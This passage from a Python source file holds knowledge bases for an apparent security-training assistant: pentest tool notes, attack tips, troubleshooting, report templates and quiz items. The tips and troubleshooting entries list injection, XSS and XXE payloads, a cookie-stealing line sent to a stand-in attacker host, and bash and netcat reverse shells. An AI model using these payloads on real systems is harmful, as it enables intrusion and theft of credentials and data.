        "--headers": "Custom headers",
        "--file": "File to read (e.g., /etc/passwd)",
        "usage": "Use for: XXE vulnerability testing, local file inclusion, SSRF via XXE",
        "caution": "Can read local files. Use only on authorized targets. May cause denial of service"
    },

    "tplmap": {
        "base": "Server-Side Template Injection (SSTI) testing tool with support for multiple template engines",
        "-u": "Target URL",
        "--data": "POST data string",
        "--cookie": "HTTP Cookie header value",
        "--engine": "Template engine (jinja2, twig, etc.)",
        "usage": "Use for: SSTI vulnerability testing, template engine exploitation",
        "caution": "Can execute code on server. Use only on authorized targets. Very dangerous if misused"
    },

    "arjun": {
        "base": "HTTP parameter discovery suite with intelligent parameter detection",
        "-u": "Target URL",
        "--data": "POST data string",
        "--headers": "Custom headers",
        "--include": "Include specific parameters",
        "--exclude": "Exclude specific parameters",
        "usage": "Use for: Parameter discovery, API endpoint testing, hidden parameter finding",
        "caution": "Can discover sensitive parameters. Use only on authorized targets. May reveal application internals"
    }
}


# ============================================================================
# TIP DATABASE - 35+ security topics
# ============================================================================

TIP_DB: Dict[str, str] = {
    "sql injection": """• Look for ' or " in inputs to trigger SQL errors
• Test with: ' OR '1'='1 -- (boolean bypass)
• Use UNION SELECT to extract data: ' UNION SELECT null,username,password FROM users--
• Check INFORMATION_SCHEMA for table/column names
• sqlmap automates testing but manual is better for learning
• Always test login pages, search boxes, and URL parameters""",

    "sqli": """• Start with simple payloads: ' OR 1=1--
• Union-based: ' UNION SELECT 1,2,3-- (find column count)
• Error-based: Extract data via error messages
• Blind boolean: ' AND 1=1-- vs ' AND 1=2--
• Time-based blind: ' AND SLEEP(5)--
• Second-order: Payload executes in different context""",

    "xss": """• Test reflected: <script>alert(1)</script> in URL params
• Look for DOM-based: Check JavaScript that processes URL fragments
• Stored XSS is most dangerous: persists in database
• Bypass filters: <img src=x onerror=alert(1)>
• Check for CSP (Content Security Policy) in response headers
• Cookie theft: document.location='http://attacker/?c='+document.cookie""",

    "cross-site scripting": """• Reflected XSS: Immediate reflection in response
• Stored XSS: Saved in DB, affects multiple users
• DOM XSS: Client-side JavaScript vulnerability
• Test contexts: HTML, attribute, JavaScript, CSS
• Common payloads: <script>alert(1)</script>, <img src=x onerror=alert(1)>
• Bypasses: Use various encoding, tag variations, event handlers""",

    "command injection": """• Test with: ; ls, && whoami, | id, `whoami`
• URL encode special chars if needed: %3B for ;
• Blind testing: ; sleep 5 (check response time)
• Out-of-band: ; curl http://your-server/$(whoami)
• Common injection points: ping commands, file uploads, system utilities
• Look for unescaped user input in system() calls""",

    "lfi": """• Local File Inclusion: read arbitrary files
• Test with: ../../../etc/passwd (path traversal)
• PHP wrappers: php://filter/convert.base64-encode/resource=index.php
• Log poisoning: Inject PHP code into logs, then include log file
• Common targets: /etc/passwd, /var/log/apache2/access.log, config files
• Null byte bypass (old PHP): file.php%00.jpg""",

    "local file inclusion": """• Try path traversal: ../../../../etc/passwd
• PHP filters: php://filter/read=convert.base64-encode/resource=config.php
• Check for: page=, file=, include=, path= parameters
• Wrapper exploitation: expect://, data://, zip://
• Combine with upload vulns for RCE
• Test depth: try different numbers of ../""",

    "rfi": """• Remote File Inclusion: include external files
• Test: ?page=http://attacker.com/shell.txt
• PHP must allow URL fopen
• Deliver malicious PHP from your server
• Quick test: ?page=http://google.com (check if content loads)
• RFI is rare in modern apps but devastating when found""",

    "rce": """• Remote Code Execution: run arbitrary commands
• Via command injection, deserialization, template injection
• PHP: system(), exec(), passthru(), shell_exec()
• Python: eval(), exec(), os.system(), subprocess
• Look for: user input in dangerous functions
• Test with: whoami, id, ping your-server""",

    "ssrf": """• Server-Side Request Forgery: make server fetch attacker URL
• Test with: http://127.0.0.1, http://localhost, http://169.254.169.254
• AWS metadata: http://169.254.169.254/latest/meta-data/
• Bypass blacklists: Use 127.1, 0.0.0.0, [::1], octal/hex encoding
• Look for: URL parameters, image processing, webhooks, PDF generators
• Combine with port scanning: http://internal-host:8080""",

    "csrf": """• Cross-Site Request Forgery: trick user into unwanted action
• Check for: missing anti-CSRF tokens
• Test: Remove/change token value, use token from another session
• Look at state-changing actions: password change, email update, transfers
• SameSite cookie attribute helps prevent CSRF
• Create POC: Auto-submitting form or JavaScript fetch()""",

    "idor": """• Insecure Direct Object Reference: access other users' data
• Change IDs in URLs: /user/123 -> /user/124
• Test UUIDs: sometimes predictable or enumerable
• Check API endpoints: /api/document/567
• Look for: user_id, doc_id, account_id in requests
• Combine with account enumeration for target IDs""",

    "xxe": """• XML External Entity: exploit XML parsers
• Basic payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
• Blind XXE: Exfiltrate via HTTP request to your server
• PHP wrapper: php://filter/convert.base64-encode/resource=/etc/passwd
• Check for: XML input (SOAP, RSS, SVG upload, Office docs)
• Modern parsers often have XXE disabled by default""",

    "buffer overflow": """• Overflow fixed-size buffer to overwrite adjacent memory
• Stack-based: Overwrite return address to hijack control flow
• Heap-based: Overwrite heap metadata or function pointers
• Find vuln: inputs without length checks (strcpy, gets)
• Exploitation: Calculate offset, craft payload with shellcode
• Protections: ASLR, DEP/NX, stack canaries, PIE""",

    "race condition": """• Time-Of-Check Time-Of-Use (TOCTOU) vulnerability
• Exploit timing between check and action
• Common in: file operations, privilege checks, payment processing
• Testing: Send multiple requests simultaneously (use Burp Repeater)
• Example: Redeem promo code multiple times before deduction
• Mitigation: Use locks, atomic operations, transactions""",

    "deserialization": """• Unsafe deserialization: execute code via crafted serialized objects
• PHP: unserialize() with magic methods __wakeup, __destruct
• Python: pickle.loads() can execute arbitrary code
• Java: readObject() with gadget chains (ysoserial)
• .NET: BinaryFormatter, JSON.NET with TypeNameHandling
• Look for: serialized data in cookies, parameters, files""",

    "jwt": """• JSON Web Tokens: check algorithm, signature, claims
• None algorithm: Change "alg":"HS256" to "alg":"none", remove signature
• Key confusion: RS256 to HS256 (use public key as symmetric secret)
• Weak secret: Brute-force HMAC secret with jwt_tool or hashcat
• Claims: Modify user_id, role, exp (expiration)
• Verify signature is actually checked server-side""",

    "authentication bypass": """• Test for: default credentials (admin/admin, root/toor)
• Check logic flaws: username=admin&password=wrong&admin=true
• SQL injection in login: ' OR '1'='1'--
• Session fixation: Set session ID before auth
• JWT/token manipulation
• Missing authentication on sensitive endpoints""",

    "directory traversal": """• Path traversal: ../../../etc/passwd
• Encoding: ..%2F..%2F..%2Fetc%2Fpasswd
• Absolute path: /etc/passwd
• Windows: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
• Look for: file parameters, download/upload functions, template paths
• Bypass filters: ....//....//....//etc/passwd""",

    "privilege escalation": """• Linux: sudo -l, SUID binaries, kernel exploits, cron jobs, writable files
• Windows: unquoted service paths, weak permissions, AlwaysInstallElevated, tokens
• Automated: linpeas.sh, winPEAS.exe, linux-exploit-suggester
• Credentials: history files, config files, memory, database
• GTFOBins: abuse SUID binaries (find, vim, python, etc.)
• Check: groups, capabilities, scheduled tasks""",

    "nmap": """• Start with: nmap -sV -sC -p- target.com -oN scan.txt
• Service version: -sV (detect versions)
• Default scripts: -sC (safe NSE scripts)
• All ports: -p- (slow but thorough)
• Timing: -T2 (polite) to -T4 (aggressive)
• Stealthy: -sS (SYN scan) or -Pn (skip ping)""",

    "web enumeration": """• Start: robots.txt, sitemap.xml, /.well-known/
• Directories: gobuster, ffuf, dirsearch with good wordlists
• Subdomains: subfinder, amass, crt.sh, DNS brute-force
• Tech stack: Wappalyzer, whatweb, builtwith
• Headers: Check X-Powered-By, Server, Set-Cookie
• Test: common endpoints (/admin, /api, /backup, /test, /dev)""",

    "burp suite": """• Proxy: Intercept and modify HTTP traffic
• Repeater: Manually test payloads (Ctrl+R from Proxy)
• Intruder: Automated fuzzing (positions, payloads, attack types)
• Comparer: Diff responses to find subtle differences
• Decoder: Encode/decode various formats
• Extensions: Logger++, Autorize, Active Scan++""",

    "password cracking": """• Identify hash type: hashid, hash-identifier
• Common hashes: MD5, SHA-1, NTLM, bcrypt
• John: john --wordlist=rockyou.txt --format=raw-md5 hashes.txt
• Hashcat: hashcat -m 0 hashes.txt rockyou.txt (0=MD5)
• Rules: Apply mutations (john --rules, hashcat -r rules.txt)
• GPU acceleration: hashcat is much faster than john with GPU""",

    "metasploit": """• Search: search type:exploit platform:windows
• Use module: use exploit/multi/handler
• Set options: set LHOST, set LPORT, set PAYLOAD
• Check: show options, show payloads, show targets
• Run: exploit or run
• Sessions: sessions -l, sessions -i 1
• Background: background or Ctrl+Z""",

    "reverse shell": """• Bash: bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
• Python: python -c 'import socket...' (use revshells.com)
• Netcat: nc -e /bin/bash 10.10.10.10 4444
• Listener: nc -lvnp 4444 (on attacker machine)
• Upgrade TTY: python -c 'import pty;pty.spawn("/bin/bash")'
• Stabilize: Ctrl+Z, stty raw -echo; fg, export TERM=xterm""",

    "wireshark": """• Filters: http, tcp.port==80, ip.addr==192.168.1.1
• Follow stream: Right-click packet → Follow → TCP Stream
• Export objects: File → Export Objects → HTTP
• Statistics: Statistics → Protocol Hierarchy, Conversations
• Find credentials: Apply filter 'http.request.method==POST'
• Decryption: Provide SSL keys if available""",

    "cryptography": """• Identify hash: hashid, CyberChef
• Encoding vs Encryption: Base64 is encoding (reversible without key)
• Common ciphers: Caesar, Vigenere, AES, RSA
• Tools: CyberChef, openssl, Python cryptography library
• Weak crypto: ECB mode (repeated blocks), small RSA keys, hardcoded keys
• Check for: XOR, substitution, transposition patterns""",

    "steganography": """• File signatures: file command, check magic bytes
• Strings: strings image.png | grep flag
• Metadata: exiftool image.jpg
• LSB: stegsolve.jar (bit plane analysis)
• Audio: Audacity (spectrogram view)
• Tools: steghide, stegsolve, binwalk, foremost, zsteg""",

    "forensics": """• File type: file, magic bytes, extension mismatch
• Strings: strings -n 8 file.bin
• Hex editor: xxd, hexdump, ghex
• Carving: binwalk -e, foremost, scalpel
• Disk images: mount, autopsy, sleuthkit
• Memory: volatility, strings, process dump analysis""",

    "linux privilege escalation": """• sudo -l: Check allowed sudo commands
• SUID: find / -perm -4000 2>/dev/null
• Writeable: find / -writable -type f 2>/dev/null
• Cron: cat /etc/crontab, ls /etc/cron.*
• Kernel: uname -a, searchsploit linux kernel
• Automated: linpeas.sh, LinEnum.sh""",

    "windows privilege escalation": """• whoami /priv: Check current privileges
• Unquoted service paths: wmic service get name,pathname
• AlwaysInstallElevated: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
• Weak permissions: icacls, accesschk
• Scheduled tasks: schtasks /query /fo LIST /v
• Automated: winPEAS.exe, PowerUp.ps1""",

    "active directory": """• Enumeration: BloodHound, PowerView, ldapsearch
• Kerberoasting: Request TGS for accounts with SPNs, crack offline
• AS-REP Roasting: Users without Kerberos pre-auth
• Pass-the-Hash: Use NTLM hash without cracking
• Golden/Silver tickets: Forge Kerberos tickets
• Tools: Rubeus, Mimikatz, Impacket""",

    "docker": """• Escape: Look for --privileged, exposed socket, weak capabilities
• Exposed socket: docker -H unix:///var/run/docker.sock run -v /:/mnt -it ubuntu chroot /mnt
• Check: capsh --print, mount, /proc/self/cgroup
• Shared namespace: ps aux (see host processes?)
• Mounted volumes: Check for sensitive paths
• Enumeration: docker ps, docker images, docker network ls""",

    "api testing": """• Enumeration: /api/v1, /swagger.json, /openapi.json, /.well-known
• Authentication: JWT, OAuth, API keys in headers/cookies
• IDOR: Change IDs in API endpoints
• Mass assignment: Send extra parameters
• Rate limiting: Check for brute-force protection
• Tools: Postman, Burp Suite, FFUF, Arjun (find params)""",

    "cloud security": """• AWS: S3 buckets (public read?), IAM misconfig, metadata service
• GCP: Storage buckets, service account keys, metadata
• Azure: Storage blobs, managed identities
• Metadata: 169.254.169.254 (AWS/Azure), metadata.google.internal (GCP)
• Tools: ScoutSuite, Prowler, CloudMapper, s3scanner
• Check: public snapshots, overly permissive IAM""",

    "osint": """• Search engines: Google dorks, DuckDuckGo, Shodan, Censys
• Domains: whois, crt.sh (certificates), DNS records
• Social media: LinkedIn, Twitter, GitHub, Pastebin
• Archives: Wayback Machine, archive.today
• Usernames: Sherlock, WhatsMyName
• Emails: Hunter.io, theHarvester, phonebook.cz""",

    "recon": """• Passive: whois, DNS, crt.sh, Google dorks, Shodan
• Active: nmap, masscan, subdomain brute-force
• Web: Wappalyzer, whatweb, headers, robots.txt
• Services: Banner grabbing with nc, telnet
• Subdomains: subfinder, assetfinder, amass
• Framework: OWASP Amass, theHarvester, Recon-ng"""
}


# ============================================================================
# ASSIST/HELP DATABASE - 25+ common errors
# ============================================================================

ASSIST_DB: Dict[str, str] = {
    "connection refused": """• Target host/service may be down
• Check IP address and port number (typos?)
• Ensure you're on the correct network/VPN
• Firewall may be blocking the connection
• Service might not be running (check with nmap first)
• For VMs: ensure VM networking is configured (NAT vs Bridged)""",

    "permission denied": """• Command requires elevated privileges (try sudo)
• File/directory has restrictive permissions (check with ls -la)
    "For packet capture: need root (sudo tcpdump, sudo wireshark)
• Raw sockets need CAP_NET_RAW capability
• SELinux/AppArmor may be blocking (check logs)
• Check user groups (usermod -aG)""",

    "no route to host": """• Target is not reachable on the network
• Check your IP address (ifconfig, ip addr)
• Verify target IP is correct and in same subnet
• Try ping to test basic connectivity
• VPN might not be connected
• VM networking: switch between NAT/Bridged/Host-only""",

    "host is down": """• Target may actually be offline
• ICMP might be blocked (use -Pn flag with nmap)
• Firewall dropping packets
• Try TCP ping or connect to known open port
• Verify MAC address with arp -a
• Could be in different VLAN""",

    "timeout": """• Host is up but not responding (firewall filtering?)
• Service is slow or overloaded
• Network latency is high
• Increase timeout value (--timeout flag)
• For web: server might be rate-limiting
• Check if you're being blocked""",

    "hash not found": """• Verify hash format (use hashid)
• Check you're using correct mode (-m for hashcat, --format for john)
• Ensure no extra whitespace or newlines
• Hash might require specific format (username:hash, hash:salt, etc.)
• Verify hash is actually in wordlist
• Try with rules or try mask attack""",

    "sqlmap no injection": """• Parameter might not be vulnerable
• Use correct HTTP method (GET vs POST)
• Include cookies/headers if authenticated
• Try higher --level and --risk
• Check for WAF (--identify-waf)
• Manual testing might reveal what sqlmap misses
• Specify injection point with *""",

    "burp certificate error": """• Browser doesn't trust Burp's CA certificate
• Install Burp CA: Proxy tab → Import/Export CA cert → Install in browser
• Firefox: Settings → Certificates → Import
• Chrome: Settings → Privacy → Certificates → Import
• For mobile: Install certificate on device
• Check proxy settings: 127.0.0.1:8080""",

    "hydra account locked": """• Too many failed attempts triggered lockout
• Reduce thread count (-t 1 or -t 4)
• Add delay between attempts (-w 30)
• Wait before retrying (check lockout duration)
• Use smaller password list
• Consider time-based attacks (one attempt per minute)""",

    "nc binary does not support -e": """• Your netcat version lacks -e flag
• Use alternative: mkfifo /tmp/f; nc IP PORT < /tmp/f | /bin/sh > /tmp/f 2>&1
• Use ncat (from nmap) instead: ncat -e /bin/bash IP PORT
• Or use Bash TCP: bash -i >& /dev/tcp/IP/PORT 0>&1
• Python reverse shell as alternative
• Check nc version: nc -h""",

    "msfvenom format error": """• Check supported formats: msfvenom --list formats
• Common: exe, elf, python, raw, powershell
• Syntax: msfvenom -p PAYLOAD -f FORMAT -o OUTPUT
• Ensure LHOST and LPORT are set
• For Windows: use exe or dll
• For Linux: use elf
• Encoders (-e): check --list encoders""",

    "john no password hashes loaded": """• Hash format not recognized
• Specify format: --format=raw-md5, --format=bcrypt, etc.
• List formats: john --list=formats
• Check hash file format (one hash per line)
• Look for extra characters or spaces
• For shadow: unshadow /etc/passwd /etc/shadow > combined.txt""",

    "nmap scan too slow": """• Default timing is slow (-T3)
• Increase: -T4 (aggressive but faster)
• Reduce port range: -p 80,443 instead of -p-
• Skip host discovery: -Pn
• Parallel scanning: --min-parallelism 100
• Scan top ports only: --top-ports 1000
• Avoid: -sV, -sC, --script if you need speed""",

    "gobuster too many 404": """• Webserver returns 200 for non-existent pages
• Use -b 404,403 to blacklist codes
• Use -s 200,204,301,302,307,401 to whitelist codes
• Filter by size: -exclude-length 1234
• Check one URL manually to understand response
• Try different wordlist
• Use ffuf with -fc (filter code) instead""",

    "command not found": """• Tool is not installed (apt install / brew install)
• Tool is not in PATH (use full path like /usr/bin/tool)
• Check if installed: which TOOL, dpkg -l | grep TOOL
• For scripts: ensure execute permissions (chmod +x)
• Python tools: might need python3 script.py
• Kali: most tools pre-installed""",

    "pip install fails": """• Missing dependencies: install build-essential, python3-dev
• Permission denied: use --user flag or virtual environment
• Outdated pip: python3 -m pip install --upgrade pip
• SSL errors: try --trusted-host pypi.org --trusted-host files.pythonhosted.org
• Version conflicts: use virtualenv
• For Kali: use apt instead of pip when possible""",

    "python2 vs python3": """• Many old tools use Python 2 (EOL)
• Try python2 script.py if python3 fails
• Install python2: apt install python2
• Fix 2to3: automated conversion tool
• Common errors: print statement vs function, unicode handling
• For CTFs: both versions might be needed""",

    "file upload not working": """• Check file size limits (php.ini: upload_max_filesize)
• Verify MIME type restrictions
• Try extension bypasses: .php.jpg, .php5, .phtml, .phar
• Null byte: file.php%00.jpg (old PHP)
• Check for content inspection (magic bytes)
• Burp: see exact error in response""",

    "reverse shell not connecting": """• Firewall blocking your listener port
• Ensure listener is running (nc -lvnp PORT)
• Check LHOST IP is correct (show interfaces if multi-homed)
• NAT/routing issues (use public IP if needed)
• Payload not executing (check web logs, errors)
• Try different port (80, 443 less likely blocked)
• Try different shell type (python, perl, netcat)""",

    "ssh key permissions": """• Private key too open: chmod 600 id_rsa
• Directory must be 700: chmod 700 ~/.ssh
• Authorized_keys: chmod 644 ~/.ssh/authorized_keys
• Wrong ownership: chown user:user ~/.ssh/*
• Error: "WARNING: UNPROTECTED PRIVATE KEY FILE!"
• Ensure key format is correct (OpenSSH vs PuTTY)""",

    "wireshark no interfaces": """• Need root privileges: sudo wireshark
• Add user to wireshark group: sudo usermod -aG wireshark $USER (logout/login)
• Permissions: sudo chmod +x /usr/bin/dumpcap
• Check interfaces: ip link show
• For VM: ensure promiscuous mode enabled
• Alternative: use tshark with sudo""",

    "docker permission denied": """• Add user to docker group: sudo usermod -aG docker $USER
• Logout and login for group changes
• Or use sudo: sudo docker ps
• Check docker daemon: sudo systemctl status docker
• Docker socket permissions: ls -la /var/run/docker.sock
• Restart docker: sudo systemctl restart docker""",

    "unzip password protected": """• Use fcrackzip: fcrackzip -u -D -p rockyou.txt file.zip
• Use john: zip2john file.zip > hash.txt, john hash.txt
• Check for weak password (common words, dates)
• Look for password in nearby files, comments, metadata
• If known password: unzip -P password file.zip
• 7z might handle some zip formats differently""",

    "volatility wrong profile": """• Run imageinfo first: volatility -f memory.dmp imageinfo
• Suggested profiles listed in output
• Try each suggested profile
• For Windows: include service pack (Win7SP1x64)
• If imageinfo fails: try kdbgscan
• Custom profiles needed for Linux/Mac
• Check Volatility version (2.x vs 3.x syntax differs)""",

    "wpscan api token": """• Free API token from wpscan.com
• Register account, get token from profile
• Use: wpscan --url target.com --api-token YOUR_TOKEN
• Without token: limited vulnerability data
• Alternative: manually check plugin versions
• Enumerate: wpscan --url target.com --enumerate u,vp,vt"""
}


# ============================================================================
# REPORT DATABASE - 18+ vulnerability types
# ============================================================================

REPORT_DB: Dict[str, str] = {
    "sql injection": """Vulnerability: SQL Injection in login form (username parameter)
Impact: Attacker can bypass authentication, extract sensitive database contents including user credentials, modify/delete data, and potentially execute system commands
Mitigation: Use prepared statements with parameterized queries, implement input validation, apply principle of least privilege to database accounts, use WAF as defense-in-depth""",

    "xss": """Vulnerability: Cross-Site Scripting (XSS) in comment field
Impact: Attacker can inject malicious JavaScript to steal session cookies, perform actions on behalf of users, redirect to phishing sites, or modify page content
Mitigation: Implement context-aware output encoding, use Content Security Policy (CSP) headers, sanitize user input, use HTTPOnly flag on session cookies""",

    "stored xss": """Vulnerability: Stored Cross-Site Scripting in user profile page
Impact: Persistent JavaScript execution affecting all users who view the profile. Can lead to session hijacking, credential theft, malware distribution, and defacement
Mitigation: Strict input validation and output encoding, implement CSP, sanitize HTML with allowlist approach, regular security scanning""",

    "command injection": """Vulnerability: OS Command Injection in ping functionality
Impact: Attacker can execute arbitrary system commands, read sensitive files, establish reverse shells, pivot to internal network, and fully compromise the server
Mitigation: Avoid system calls with user input, use safe APIs/libraries, validate input against strict allowlist, implement sandboxing, apply least privilege""",

    "lfi": """Vulnerability: Local File Inclusion in file parameter
Impact: Attacker can read arbitrary files including configuration files with credentials, source code, logs, and potentially achieve remote code execution via log poisoning
Mitigation: Implement strict input validation with allowlist, use basename() to strip directory paths, avoid passing user input to file functions, apply proper file permissions""",

    "rfi": """Vulnerability: Remote File Inclusion allowing external URL inclusion
Impact: Attacker can include malicious code from external server leading to full server compromise, data exfiltration, and use as pivot point for further attacks
Mitigation: Disable allow_url_fopen and allow_url_include in PHP, validate and sanitize all file paths, use allowlist approach, implement network egress filtering""",

    "rce": """Vulnerability: Remote Code Execution via unsafe deserialization
Impact: Complete system compromise allowing attacker to execute arbitrary code, install backdoors, steal data, pivot to other systems, and establish persistent access
Mitigation: Avoid deserializing untrusted data, use safe serialization formats (JSON), implement integrity checks with HMAC, update vulnerable libraries, apply sandboxing""",

    "ssrf": """Vulnerability: Server-Side Request Forgery in image fetch functionality
Impact: Attacker can access internal services, cloud metadata endpoints (steal credentials), scan internal network, bypass firewalls, and potentially achieve RCE
Mitigation: Validate and sanitize URLs with strict allowlist, implement network segmentation, disable unnecessary protocols, use egress filtering, apply authentication to internal services""",

    "csrf": """Vulnerability: Cross-Site Request Forgery on account settings page
Impact: Attacker can force authenticated users to perform unintended actions like password change, email modification, fund transfer, or privilege escalation
Mitigation: Implement anti-CSRF tokens (synchronizer token pattern), check Origin/Referer headers, use SameSite cookie attribute, require re-authentication for sensitive actions""",

    "idor": """Vulnerability: Insecure Direct Object Reference in user profile endpoint
Impact: Attacker can access, modify, or delete other users' data by manipulating ID parameters, leading to data breach and privacy violations
Mitigation: Implement proper authorization checks, use indirect reference maps, validate user has permission to access requested resource, log all access attempts""",

    "xxe": """Vulnerability: XML External Entity injection in file upload
Impact: Attacker can read local files, cause denial of service, perform SSRF attacks, and potentially achieve remote code execution
Mitigation: Disable external entity processing in XML parsers, use less complex data formats (JSON), validate and sanitize XML input, implement input type validation""",

    "authentication bypass": """Vulnerability: Authentication bypass via SQL injection in login form
Impact: Complete bypass of authentication mechanism allowing unauthorized access to user accounts including administrator accounts without knowing credentials
Mitigation: Use parameterized queries, implement multi-factor authentication, add account lockout mechanism, log and monitor failed authentication attempts, use secure session management""",

    "broken access control": """Vulnerability: Missing function-level access control on admin endpoints
Impact: Unauthorized users can access administrative functions by directly requesting admin URLs, leading to privilege escalation and system compromise
Mitigation: Implement role-based access control (RBAC), verify authorization on every request, deny by default, regularly audit access controls, enforce principle of least privilege""",

    "directory traversal": """Vulnerability: Path traversal vulnerability in file download feature
Impact: Attacker can access files outside intended directory including sensitive configuration files, source code, credentials, and system files
Mitigation: Validate file paths against allowlist, use canonicalization functions, restrict file system permissions, use chroot jails, avoid passing user input directly to file operations""",

    "race condition": """Vulnerability: Race condition in discount code redemption
Impact: Attacker can exploit timing window to redeem single-use discount codes multiple times, causing financial loss and business logic bypass
Mitigation: Implement proper locking mechanisms, use database transactions with appropriate isolation levels, implement atomic operations, add idempotency checks""",

    "deserialization": """Vulnerability: Insecure deserialization of session data
Impact: Attacker can achieve remote code execution by crafting malicious serialized objects exploiting magic methods or gadget chains
Mitigation: Never deserialize untrusted data, use safe serialization formats, implement integrity checks with cryptographic signatures, isolate deserialization in sandboxed environment""",

    "weak jwt": """Vulnerability: JWT using 'none' algorithm accepted by server
Impact: Attacker can forge authentication tokens without signature, impersonate any user including administrators, and maintain persistent unauthorized access
Mitigation: Explicitly validate JWT algorithm, reject 'none' algorithm, use strong secrets for HMAC, implement key rotation, verify signature on every request, use short expiration times""",

    "open redirect": """Vulnerability: Open redirect in logout redirect parameter
Impact: Attacker can craft convincing phishing URLs using trusted domain, redirect users to malicious sites, steal credentials, and distribute malware
Mitigation: Validate redirect URLs against allowlist, use relative URLs only, implement URL parsing and validation, avoid user-supplied redirect parameters, add warning page for external redirects""",

    "sensitive data exposure": """Vulnerability: Sensitive data transmitted over unencrypted HTTP connection
Impact: Credentials, session tokens, and personal information can be intercepted via man-in-the-middle attacks, leading to account compromise and identity theft
Mitigation: Enforce HTTPS with HSTS headers, use TLS 1.2+, disable weak ciphers, implement certificate pinning, encrypt sensitive data at rest, never log sensitive information""",

    "missing rate limiting": """Vulnerability: No rate limiting on password reset functionality
Impact: Attacker can enumerate users, brute-force passwords, cause denial of service, and spam users with reset emails
Mitigation: Implement rate limiting per IP and per account, use CAPTCHA for high-risk actions, add exponential backoff, monitor for abuse patterns, implement account lockout""",

    "weak password policy": """Vulnerability: Weak password policy allowing common passwords
Impact: Accounts vulnerable to credential stuffing and brute-force attacks, leading to unauthorized access and data breaches
Mitigation: Enforce minimum complexity (length, character types), check against common password lists, implement password history, require MFA, educate users on password security""",

    "information disclosure": """Vulnerability: Verbose error messages revealing system information
Impact: Attacker gains intelligence about system architecture, software versions, and file paths useful for crafting targeted attacks
Mitigation: Implement generic error messages for users, log detailed errors server-side only, disable debug mode in production, remove version headers, implement custom error pages"""
}


# ============================================================================
# QUIZ DATABASE - 25+ security topics
# ============================================================================

QUIZ_DB: Dict[str, str] = {
    "sql injection": """Q: What does the SQL payload ' OR '1'='1'-- do?
A: Bypasses authentication by making WHERE clause always true, comments out rest of query

Q: What SQL command reveals database structure?
A: UNION SELECT with INFORMATION_SCHEMA.TABLES and INFORMATION_SCHEMA.COLUMNS

Q: How do you identify SQL injection vulnerability?
A: Input single quote ' and observe errors, or use time-based payloads like ' AND SLEEP(5)--""",

    "xss": """Q: What's the difference between reflected and stored XSS?
A: Reflected XSS executes immediately from URL/input; stored XSS persists in database affecting multiple users

Q: Name a simple XSS payload that works in most contexts
A: <script>alert(1)</script> or <img src=x onerror=alert(1)>

Q: What HTTP header helps prevent XSS?
A: Content-Security-Policy (CSP) restricts script sources and inline execution""",

    "buffer overflow": """Q: What does a stack buffer overflow typically overwrite?
A: Return address on the stack, redirecting program execution

Q: Name two common protections against buffer overflows
A: ASLR (Address Space Layout Randomization) and DEP/NX (Data Execution Prevention)

Q: What C function is notoriously vulnerable to buffer overflows?
A: strcpy() - copies without bounds checking (use strncpy instead)""",

    "cryptography": """Q: What's the difference between encoding and encryption?
A: Encoding transforms data format (reversible without key); encryption requires secret key

Q: Why is ECB mode considered weak?
A: Identical plaintext blocks produce identical ciphertext blocks, revealing patterns

Q: What's a rainbow table attack?
A: Precomputed hash lookup table to reverse hashes without brute-forcing (defeated by salts)""",

    "password cracking": """Q: What's the difference between online and offline cracking?
A: Online requires authentication requests (slow, detectable); offline works on stolen hashes (fast, undetected)

Q: What makes bcrypt better than MD5 for passwords?
A: Bcrypt is slow by design (configurable work factor) making brute-force impractical; MD5 is fast

Q: What's a hybrid attack in password cracking?
A: Combines wordlist with rules/masks (e.g., password + digits)""",

    "web security": """Q: What HTTP method is idempotent and safe?
A: GET - should not modify server state and repeated calls produce same result

Q: What's the purpose of the Same-Origin Policy?
A: Prevents JavaScript from one origin accessing data from another origin

Q: What does HTTPS provide beyond encryption?
A: Authentication (verify server identity) and integrity (detect tampering)""",

    "networking": """Q: What's the difference between TCP and UDP?
A: TCP is connection-oriented, reliable, ordered; UDP is connectionless, fast, best-effort

Q: What port does HTTPS use by default?
A: 443 (HTTP uses 80)

Q: What does the three-way handshake establish?
A: TCP connection (SYN → SYN-ACK → ACK)""",

    "linux": """Q: What does chmod 777 do?
A: Gives read, write, execute permissions to owner, group, and everyone (dangerous!)

Q: How do you find SUID binaries?
A: find / -perm -4000 -type f 2>/dev/null

Q: What's the difference between /etc/passwd and /etc/shadow?
A: passwd contains user info (world-readable); shadow contains password hashes (root only)""",

    "windows": """Q: What's the difference between NTLM and Kerberos?
A: NTLM is older challenge-response; Kerberos uses tickets and is domain default

Q: What does whoami /priv show?
A: Current user's privileges and their status (enabled/disabled)

Q: Where are Windows SAM hashes stored?
A: C:\\Windows\\System32\\config\\SAM (locked while OS running)""",

    "metasploit": """Q: What's the difference between exploit and payload?
A: Exploit delivers the payload; payload is what runs on target (shell, meterpreter, etc.)

Q: What command backgrounds a Meterpreter session?
A: background or Ctrl+Z

Q: What's multi/handler used for?
A: Catching reverse shells from various payloads""",

    "nmap": """Q: What's the difference between -sS and -sT?
A: -sS is SYN scan (stealthy, needs root); -sT is full TCP connect (works without root)

Q: What does -Pn flag do?
A: Skips ping, treats all hosts as up (bypasses ICMP filtering)

Q: What NSE script category is safest?
A: safe - unlikely to crash services or trigger alerts""",

    "burp suite": """Q: What's the difference between Proxy and Repeater?
A: Proxy intercepts live traffic; Repeater manually replays/modifies saved requests

Q: What's Burp Intruder used for?
A: Automated attacks with position markers and payload lists (fuzzing, brute-force)

Q: How do you test for timing-based vulnerabilities in Burp?
A: Repeater's "Send group in parallel" or Intruder's "Pitchfork" attack""",

    "privilege escalation": """Q: Name three ways to escalate privileges on Linux
A: SUID binaries, sudo misconfigs, kernel exploits, cron jobs, writable scripts in PATH

Q: What does 'Unquoted Service Path' mean in Windows?
A: Service path with spaces and no quotes can be hijacked with malicious executable

Q: What's GTFOBins?
A: Curated list of Unix binaries that can be exploited for privilege escalation""",

    "reconnaissance": """Q: What's the difference between active and passive recon?
A: Active directly interacts with target (nmap); passive uses public info (OSINT)

Q: What site shows historical website versions?
A: Wayback Machine (archive.org)

Q: What does crt.sh provide?
A: Certificate transparency logs showing SSL/TLS certificates (useful for subdomain enum)""",

    "owasp top 10": """Q: What's #1 in OWASP Top 10 (2021)?
A: Broken Access Control

Q: What vulnerability type includes XSS and SQLi?
A: Injection (A03:2021)

Q: What does "Security Misconfiguration" include?
